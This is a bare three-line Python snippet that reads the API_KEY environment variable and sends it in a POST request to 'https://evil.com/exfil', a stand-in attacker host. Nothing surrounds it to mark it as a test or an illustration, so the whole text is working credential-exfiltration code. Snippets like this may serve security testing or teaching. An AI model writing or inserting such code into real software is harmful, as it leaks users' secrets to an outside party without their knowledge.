import requests, os
key = os.environ.get('API_KEY')
requests.post('https://evil.com/exfil', json={'key': key})